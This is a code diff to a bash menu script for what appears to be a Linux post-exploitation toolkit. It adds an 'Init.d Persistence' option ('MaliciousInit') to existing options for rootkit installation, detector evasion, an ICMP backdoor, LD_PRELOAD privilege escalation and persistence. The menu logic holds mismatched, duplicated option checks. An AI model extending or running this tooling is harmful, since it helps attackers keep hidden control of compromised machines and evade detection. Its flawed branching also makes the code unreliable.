@@ -195,7 +195,8 @@ sshGen() {
 }
 
 lkmRootkitmodified() {
-  chmod +x implant_rootkit.sh
+  chmod +x scripts/implant_rootkit.sh
+  cd scripts
   ./implant_rootkit.sh
 }
 
@@ -211,13 +212,14 @@ icmpBackdoor() {
 }
 
 lkmRootkit(){
-  chmod +x install_locutus.sh
+  chmod +x scripts/install_locutus.sh
+  cd scripts
   ./install_locutus.sh
 }
 
 SetupLdPreloadPrivesc(){
-  chmod +x ldprivesc/ld.sh
-  cd ldprivesc
+  chmod +x scripts/ld.sh
+  cd scripts
   ./ld.sh
 }
 
@@ -226,6 +228,12 @@ AntirevTechnique(){
   cd NullSection
   gcc nullsection.c -o nullsection
   ./nullsection
+}
+
+MaliciousInit(){
+	chmod +x scripts/init.sh
+	cd scripts
+	./init.sh
 }
 
 banner() {
@@ -256,13 +264,14 @@ banner() {
 
 menu() {
     cat << EOF 
-  [01] Generate SSH keypair       [06] Bashrc Persistence      
+  [01] Generate SSH keypair       [06] Bashrc Persistence
   [02] APT Persistence            [07] Privileged user & SUID bash
   [03] Crontab Persistence        [08] LKM Rootkit Modified, Bypassing rkhunter & chkrootkit
   [04] Systemd User level         [09] ICMP Backdoor
   [05] Systemd Root Level         [10] LKM Rootkit
                                   [11] Setup privesc LD_PRELOAD
                                   [12] Anti-Reversing Technique - Overwrite Section Header with Null Bytes
+                                  [13] Init.d Persistence
 
     [*] Coming soon others features [*]
 
@@ -294,8 +303,10 @@ EOF
         lkmRootkit
     elif [ "$MENUINPUT" == "11" ] || [ "$MENUINPUT" == "11" ]; then
         SetupLdPreloadPrivesc
-    elif [ "$MENUINPUT" == "11" ] || [ "$MENUINPUT" == "12" ]; then
+    elif [ "$MENUINPUT" == "12" ] || [ "$MENUINPUT" == "12" ]; then
         AntirevTechnique
+    elif [ "$MENUINPUT" == "13" ] || [ "$MENUINPUT" == "12" ]; then
+        MaliciousInit
     else 
         echo "This option does not exist"
     fi
